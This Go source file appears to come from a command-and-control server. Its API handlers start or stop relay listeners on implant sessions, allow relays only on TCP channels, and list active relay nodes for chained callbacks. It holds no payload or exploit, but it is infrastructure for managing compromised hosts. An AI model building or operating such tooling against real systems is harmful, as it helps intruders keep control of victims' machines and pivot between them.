package api

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/common/types"
	"toshell/internal/server/listener"
	"toshell/internal/server/logging"
)

// relayControlHandler 运行时中继控制：对已上线会话下发 start/stop 中继监听。
// action: start（需 addr）/ stop。
func (s *Server) relayControlHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Action string `json:"action"`
		Addr   string `json:"addr"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.Action == "start" && req.Addr == "" {
		http.Error(w, `{"error":"addr is required for start"}`, http.StatusBadRequest)
		return
	}
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	// 通道能力闸：中继只在 TCP 通道实现（见 listener.SupportsRelayChannel 的说明）。
	// 改之前，对 WS/HTTP/MQTT 会话下发 relay start 会"回 200 + 任务下发成功"，
	// 植入端也真的开始监听，但上行子帧在服务端无处可解 —— 子植入体永远不上线，
	// 操作员只看到"成功"却等不到任何节点。这里改成**显式 409**：与 HTTP 通道
	// 口径一致（谁都不支持），也不再把"点了没反应"伪装成成功。
	// 409 Conflict 而不是 400：请求本身合法，是与当前会话所在通道的能力冲突。
	if s.sessionMgr != nil {
		if sess, err := s.sessionMgr.Get(id); err == nil && sess != nil && sess.Info != nil {
			if !listener.SupportsRelayChannel(sess.Info.Listener) {
				logging.Warn("api", "relay control rejected: channel %q does not support relay (session %s)", sess.Info.Listener, id)
				http.Error(w, fmt.Sprintf(`{"error":"当前会话所在通道（%s）不支持中继：链式回连只在 TCP 通道实现，请改用 TCP 监听器或改用直连"}`, sess.Info.Listener), http.StatusConflict)
				return
			}
		}
	}

	taskInfo, err := s.taskMgr.CreateRelayControl(id, req.Action, req.Addr)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "relay control (%s, addr=%s) pushed to session %s", req.Action, req.Addr, id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"action":    req.Action,
		"addr":      req.Addr,
		"message":   "relay control task pushed",
	})
}

// listRelayNodesHandler 列出当前正在监听的中继节点，供前端"选择中继会话"作为服务器地址。
func (s *Server) listRelayNodesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	var nodes []types.RelayNode
	if s.listener != nil {
		nodes = s.listener.ListRelayNodes()
	}
	if nodes == nil {
		nodes = []types.RelayNode{}
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"relay_nodes": nodes,
		"count":       len(nodes),
	})
}
